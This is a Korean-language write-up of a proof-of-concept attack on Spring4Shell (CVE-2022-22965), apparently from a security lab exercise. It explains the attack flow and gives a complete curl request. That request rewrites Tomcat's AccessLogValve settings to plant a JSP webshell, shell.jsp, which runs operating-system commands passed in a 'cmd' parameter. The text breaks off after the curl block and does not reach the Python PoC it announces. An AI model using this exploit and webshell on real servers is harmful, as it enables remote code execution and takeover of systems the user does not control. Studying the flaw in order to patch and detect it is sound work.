# Exploitation – Spring4Shell(CVE-2022-22965) PoC 공격 방법

본 문서는 Spring4Shell 취약점을 이용해 웹셸(JSP)을 생성하고  
OS 명령 실행(RCE)을 수행하는 과정에 사용한 **curl 기반 PoC**와 **Python PoC**를 정리한 문서입니다.

---

## 1. 공격 개요

Spring4Shell(CVE-2022-22965)은 Spring MVC의 `WebDataBinder`가  
ClassLoader까지 접근 가능한 Property Path를 허용하는 문제를 악용하여  
Tomcat AccessLogValve 설정을 강제로 덮어쓰고 **JSP 웹셸을 생성하는 방식**으로 RCE를 유발합니다.

공격 흐름은 다음과 같습니다:

1. WebDataBinder 파라미터 조작  
2. AccessLogValve override  
3. `shell.jsp` 생성  
4. `/shell.jsp?cmd=명령어` 로 명령 실행

---

## 2. curl 기반 PoC 공격 방법

아래 curl 요청은 AccessLogValve 설정을 조작해  
ROOT 디렉토리에 `shell.jsp` 파일을 생성하는 PoC입니다.

> ⚠️ 주의: IP/도메인은 실제 테스트 환경에 맞게 변경하세요.

```bash
curl -X POST "http://[TARGET]/demo/itsecurityco" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.pattern=<% out.println(new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream()).useDelimiter(\"\\\\A\").next()); %>" \
  --data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp" \
  --data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT" \
  --data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell"
